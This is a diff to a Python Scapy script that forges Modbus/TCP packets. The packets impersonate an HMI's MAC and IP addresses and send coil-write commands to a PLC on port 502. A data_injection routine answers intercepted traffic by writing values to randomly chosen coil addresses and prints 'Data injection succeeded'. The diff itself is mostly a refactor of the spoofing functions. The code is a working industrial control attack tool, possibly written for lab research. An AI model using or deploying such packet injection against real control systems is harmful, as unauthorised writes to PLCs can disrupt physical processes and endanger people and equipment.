@@ -15,16 +15,16 @@ ack_frame2 = ''
 # Modbus ADU
 class ModbusTCP(Packet):
     name = "Modbus/TCP"
-    fields_desc = [ ShortField("Transaction Identifier", 233),
-                    ShortField("Protocol Identifier", 0),
+    fields_desc = [ ShortField("trans_id", 233),
+                    ShortField("proto_id", 0),
                     ShortField("Length", 9),
-                    XByteField("Unit Identifier", 1),
+                    XByteField("uid", 1),
                     ]
 
 # Modbus PDU
 class Modbus(Packet):
     name = "Modbus"
-    fields_desc = [ XByteField("Func_Code", 16),
+    fields_desc = [ XByteField("func_code", 16),
                     ShortField("ref_num", 233),
                     ShortField("Word_Count", 1),
                     XByteField("Byte_Count", 2),
@@ -33,17 +33,15 @@ class Modbus(Packet):
 
 class Modbus0(Packet):
     name = "Modbus"
-    a1 = randrange(40, 50)
-    fields_desc = [ XByteField("Function Code", 5),
-                    ShortField("Reference Number", a1),
-                    ShortField("Data", 0x0000),
+    fields_desc = [ XByteField("func_code", 5),
+                    ShortField("ref_num", 2),
+                    ShortField("data", 0x0000),
                     ]
 class Modbus1(Packet):
     name = "Modbus"
-    a2 = randrange(40, 50)
-    fields_desc = [ XByteField("Function Code", 5),
-                    ShortField("Reference Number", a2),
-                    ShortField("Data", 0xff00),
+    fields_desc = [ XByteField("func_code", 5),
+                    ShortField("ref_num", 2),
+                    ShortField("data", 0xff00),
                     ]
 
 def changeData_reg(addr, val):
@@ -57,22 +55,24 @@ def changeData_reg(addr, val):
     mb_reg[Modbus].reg_val = val
     sendp(mb_reg)
 
-def changeData0():
+def changeData0(addr):
     handshake()
     mb_0 = Ether(src=hmi_mac, dst=plc_mac)/\
        IP(src=hmi_ip, dst=plc_ip)/\
        TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
        ModbusTCP()/\
        Modbus0()
+    mb_0[Modbus0].ref_num = addr
     sendp(mb_0)
 
-def changeData1():
+def changeData1(addr):
     handshake()
     mb_1 = Ether(src=hmi_mac, dst=plc_mac)/\
        IP(src=hmi_ip, dst=plc_ip)/\
        TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
        ModbusTCP()/\
        Modbus1()
+    mb_1[Modbus1].ref_num = addr
     sendp(mb_1)
 
 
@@ -162,12 +162,14 @@ def data_injection():
                                         print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                         print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                 elif st[-9: -1] == "\\xff\\x00":
-                                        changeData0()
+                                        ref2 = randrange(40, 50)
+                                        changeData0(ref2)
                                         xx = 0
                                         print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                         print("\033[1;36m{}\033[0m".format(modbus_query.show()))
                                 elif st[-9: -1] == "\\x00\\x00":
-                                        changeData1()
+                                        ref3 = randrange(40, 50)
+                                        changeData1(ref3)
                                         xx = 0
                                         print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                         print("\033[1;36m{}\033[0m".format(modbus_query.show()))
